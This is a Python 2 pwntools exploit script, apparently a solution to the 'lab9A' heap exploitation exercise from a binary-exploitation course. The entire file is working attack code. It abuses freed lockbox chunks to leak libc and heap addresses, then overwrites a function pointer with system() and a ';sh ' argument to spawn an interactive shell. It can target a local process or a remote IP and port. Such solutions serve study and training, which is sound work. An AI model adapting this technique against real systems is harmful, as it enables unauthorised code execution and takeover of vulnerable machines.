#!/usr/bin/env python2

from pwn import *

# == How to use ==
# python remote.py LOCAL
# python remote.py REMOTE IP=127.0.0.1 PORT=1337

settings = {

    # Path to binary
    "binary"        : "./lab9A",

    # Path to custom libc
    "libc"          : None,
}

def new(index, size):
    p.sendlineafter("Enter choice: ", "1")
    p.sendlineafter("Which lockbox do you want?: ", str(index))
    p.sendlineafter("How many items will you store?: ", str(size))

def add(index, value):
    p.sendlineafter("Enter choice: ", "2")
    p.sendlineafter("Which lockbox?: ", str(index))
    p.sendlineafter("Item value: ", str(value))

def find(index, value):
    p.sendlineafter("Enter choice: ", "3")
    p.sendlineafter("Which lockbox?: ", str(index))
    p.sendlineafter("Item value: ", str(value))
    p.recvuntil("] = ")
    return int(p.recvline())

def delete(index):
    p.sendlineafter("Enter choice: ", "4")
    p.sendlineafter("Which set?: ", str(index))

def write_on_heap(addr, value, start):
    log.info("Writing {} to {}".format(hex(value), hex(addr)))
    offset = (addr - start) / 4

    max_size = 0x100
    while True:
        if value % max_size == offset:
            break
        max_size += 1

    new(2, max_size)
    add(2, value)
    delete(2)

# Exploit here
def exploit():

    # Fill lockboxes
    new(0, 0x20) # Create chunk #1
    new(1, 0x20) # Create chunk #2
    new(2, 0x9000) # Create chunk #3

    # Free all lockboxes
    delete(2)
    delete(1)
    delete(0)

    # Create a large lockbox to overwrite function pointers
    new(2, 0x100)

    # Leak libc
    libc = (find(2, 0) & 0xffffffff) - 0x1b27b0 # Local
    libc = (find(2, 0) & 0xffffffff) - 0x1aa450 # Remote
    log.info("Libc : {}".format(hex(libc)))

    # Calculate system
    system = libc + 0x3ada0 # local
    system = libc + 0x40190 # remote
    log.info("System : {}".format(hex(system)))

    # Leak heap
    heap = (find(2, 34) & 0xffffffff) - 0x5b78
    log.info("Heap : {}".format(hex(heap)))

    # Release #2 into heap
    delete(2)

    # Write values
    # &lockbox[1].func = 0x8e7bae0
    # lockbox[2]->table = 0x8e7ba58
    target = heap + 0x5ae0
    table =  heap + 0x5a58
    write_on_heap(target, target + 0x10, table)
    write_on_heap(target+4, u32(";sh "), table)
    write_on_heap(target + 0x18, system, table)

    add(1, 0)
    p.interactive()


# Initial setup
if __name__  == "__main__":

    binary = ELF(settings['binary'])
    p = None

    if settings['libc']:
        binary.libc = ELF(settings['libc'])


    if args['LOCAL']:
        p = process(binary.path)

    if args['REMOTE']:
        if not all([args.IP, args.PORT]):
            log.warning("Missing IP/PORT arguments.")
            exit()

        p = remote(args.IP, int(args.PORT))

    if not p:
        log.warning("Missing LOCAL/REMOTE argument.")
        exit()

    pause()
    exploit()
